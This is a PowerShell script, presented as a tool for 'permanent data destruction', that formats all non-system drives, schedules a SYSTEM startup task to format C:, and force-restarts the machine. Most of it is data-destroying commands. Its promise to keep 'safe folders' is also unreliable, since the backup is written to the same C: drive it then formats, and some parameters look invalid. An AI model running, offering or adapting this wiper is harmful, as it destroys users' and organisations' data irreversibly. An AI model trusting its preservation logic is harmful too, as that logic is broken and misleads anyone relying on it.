<#
.SYNOPSIS
Total Drive Annihilation - Permanent Data Destruction with Safe Folder Exclusion

.DESCRIPTION
Protection of freedom of ideas, thoughts, alternatives to the ONE WAY of the History/Culture/Event Controllers.
A multi-threaded script that:
1. Checks safe folder locations (pauses if any are missing)
2. Deletes all files/folders in all drives except C:
3. Schedules secure erase of C: for next boot
4. Force restarts to complete the process
#>

# ===== CONFIG =====
$WipePasses = 1  # Set to 3 for DoD 5220.22-M compliance (slower)
$SafeFolders = "C:\Users"  # Comma-separated list of folders to preserve (e.g., "C:\Users,E:\Personal")

# ===== FUNCTIONS =====
function Invoke-TotalWipe {
    param([string]$DriveLetter)
    try {
        Write-Host "[!] NUKE INITIATED ON DRIVE $DriveLetter"
        Format-Volume -DriveLetter $DriveLetter -FileSystem NTFS -Force -Confirm:$false -NumberOfPasses $WipePasses
        Write-Host "[✓] DRIVE $DriveLetter ERASED" -ForegroundColor Green
    } catch {
        Write-Host "[X] FAILED TO WIPE $DriveLetter : $_" -ForegroundColor Red
    }
}

function Protect-SafeFolders {
    param([array]$Folders)
    foreach ($folder in $Folders) {
        $markerPath = Join-Path $folder "DO_NOT_DELETE_SAFE_FOLDER"
        if (-not (Test-Path $folder)) {
            New-Item -ItemType Directory -Path $folder -Force | Out-Null
        }
        Set-Content -Path $markerPath -Value "This folder is protected from deletion" -Force
        Write-Host "[!] SAFE FOLDER MARKER CREATED: $markerPath"
    }
}

# ===== INITIAL WARNING =====
Write-Host "=== DESTROY_ALL SCRIPT ===" -ForegroundColor Red
Write-Host "THIS WILL DESTROY ALL DATA ON ALL DRIVES EXCEPT SAFE FOLDERS!" -ForegroundColor Red
Write-Host "C: DRIVE WILL BE WIPED AFTER REBOOT" -ForegroundColor Red
Write-Host "`nCurrent safe folders: $SafeFolders" -ForegroundColor Yellow
Write-Host "Edit the script to change safe folders before running!`n" -ForegroundColor Yellow

# ===== SAFE FOLDER PROCESSING =====
$safeFoldersArray = $SafeFolders.Split(',') | ForEach-Object { $_.Trim() }

# Remove duplicates and validate paths
$safeFoldersArray = $safeFoldersArray | Sort-Object -Unique | Where-Object { $_ -ne "" }

# ===== FAILSAFE VALIDATION =====
$missingFolders = @()
$validFolders = @()

foreach ($folder in $safeFoldersArray) {
    if (Test-Path $folder) {
        $validFolders += $folder
    } else {
        $missingFolders += $folder
    }
}

# Show warning if any safe folders are missing
if ($missingFolders.Count -gt 0) {
    Write-Host "`n[!] WARNING: MISSING SAFE FOLDERS DETECTED!" -ForegroundColor Red
    Write-Host "These folders will NOT be preserved:" -ForegroundColor Yellow
    $missingFolders | ForEach-Object { Write-Host "  - $_" }
    
    $choice = $null
    while ($choice -notin 'Y','N') {
        $choice = Read-Host "`nContinue anyway? (Y/N)"
        $choice = $choice.Trim().ToUpper()
    }

    if ($choice -eq 'N') {
        Write-Host "[!] OPERATION CANCELLED BY USER" -ForegroundColor Yellow
        exit
    }
}

# Update safe folders array to only include valid paths
$safeFoldersArray = $validFolders

# ===== MAIN EXECUTION =====
Write-Host "`n=== TOTAL DATA ANNIHILATION INITIATED ===" -ForegroundColor Red

# Display safe folders that will be preserved
if ($safeFoldersArray.Count -gt 0) {
    Write-Host "SAFE FOLDERS THAT WILL BE PRESERVED:" -ForegroundColor Green
    $safeFoldersArray | ForEach-Object { Write-Host "  - $_" }
    Protect-SafeFolders -Folders $safeFoldersArray
} else {
    Write-Host "[!] NO VALID SAFE FOLDERS FOUND - ALL DATA WILL BE DESTROYED" -ForegroundColor Red
    $choice = Read-Host "Are you sure you want to continue? (Y/N)"
    if ($choice -ne 'Y') { exit }
}

# ---- PHASE 1: DESTROY NON-C DRIVES ----
$NonC_Drives = Get-Partition | Where-Object { 
    $_.DriveLetter -and 
    $_.DriveLetter -ne 'C' -and 
    (Get-Volume -DriveLetter $_.DriveLetter).DriveType -eq 'Fixed'
} | Select-Object -ExpandProperty DriveLetter

foreach ($Drive in $NonC_Drives) {
    Invoke-TotalWipe -DriveLetter $Drive
}

# ---- PHASE 2: SCHEDULE C: DESTRUCTION ----
if (Get-Partition -DriveLetter 'C' -ErrorAction SilentlyContinue) {
    Write-Host "[!] PREPARING C: DRIVE DESTRUCTION ON REBOOT" -ForegroundColor Yellow

    # Create the post-reboot script
    $KillScript = @"
@echo off
setlocal enabledelayedexpansion

:: Safe folders to preserve
set SAFE_FOLDERS=$($safeFoldersArray -join ';')

echo PREPARING SAFE FOLDER PRESERVATION...
timeout /t 10 > nul

:: Create temp root directory
set TEMP_ROOT=%SystemDrive%\TEMP_SAFE_%RANDOM%
mkdir "%TEMP_ROOT%" > nul 2>&1

:: Backup each safe folder
for %%f in ("%SAFE_FOLDERS:;=" "%") do (
    set "folder=%%~f"
    if exist "!folder!" (
        set "folder_name=!folder:\=_!"
        set "folder_name=!folder_name::=!"
        set "backup_dir=!TEMP_ROOT!\!folder_name!"
        echo BACKING UP: !folder! to !backup_dir!
        robocopy "!folder!" "!backup_dir!" /E /COPYALL /MIR /R:1 /W:1 /LOG:"%TEMP_ROOT%\backup.log" > nul
    )
)

:: Wipe C: drive
echo WIPING C: DRIVE...
format C: /FS:NTFS /P:$WipePasses /Y > nul

:: Restore safe folders
for %%f in ("%SAFE_FOLDERS:;=" "%") do (
    set "folder=%%~f"
    set "folder_name=!folder:\=_!"
    set "folder_name=!folder_name::=!"
    set "backup_dir=!TEMP_ROOT!\!folder_name!"
    
    if exist "!backup_dir!" (
        echo RESTORING: !folder! from !backup_dir!
        mkdir "!folder!" > nul 2>&1
        robocopy "!backup_dir!" "!folder!" /E /COPYALL /MIR /LOG:"%TEMP_ROOT%\restore.log" > nul
    )
)

:: Cleanup
rd /s /q "%TEMP_ROOT%" > nul 2>&1
shutdown /s /t 0
"@

    $ScriptPath = "$env:Temp\killc.cmd"
    $KillScript | Out-File -FilePath $ScriptPath -Force -Encoding ascii

    # Schedule it to run at next boot
    schtasks /create /tn "C_Drive_Killer" /tr "$ScriptPath" /sc ONSTART /ru SYSTEM /f | Out-Null

    # ---- PHASE 3: FORCE RESTART ----
    Write-Host "[!] SYSTEM WILL NOW REBOOT TO WIPE C: DRIVE" -ForegroundColor Magenta
    if ($safeFoldersArray.Count -gt 0) {
        Write-Host "[!] THESE SAFE FOLDERS WILL BE PRESERVED:" -ForegroundColor Green
        $safeFoldersArray | ForEach-Object { Write-Host "  - $_" -ForegroundColor Green }
    }
    
    # Force close all applications
    Write-Host "[!] FORCE CLOSING ALL APPLICATIONS..." -ForegroundColor Yellow
    Get-Process | Where-Object { $_.MainWindowTitle } | Stop-Process -Force -ErrorAction SilentlyContinue
    
    # Immediate forced restart
    Restart-Computer -Force
}

# ---- FINAL MESSAGE ----
$safeFoldersList = if ($safeFoldersArray.Count -gt 0) { $safeFoldersArray -join ", " } else { "None" }
$missingFoldersList = if ($missingFolders.Count -gt 0) { $missingFolders -join ", " } else { "None" }

Write-Host @"

=== OPERATION SUMMARY ===
- All non-C drives: ERASED
- C: drive: SCHEDULED FOR DESTRUCTION ON REBOOT
- Safe folders preserved: $safeFoldersList
- Missing folders not preserved: $missingFoldersList
- System will SHUT DOWN after C: is wiped

(╯°□°)╯︵ ┻━┻  GOODBYE!
"@ -ForegroundColor Cyan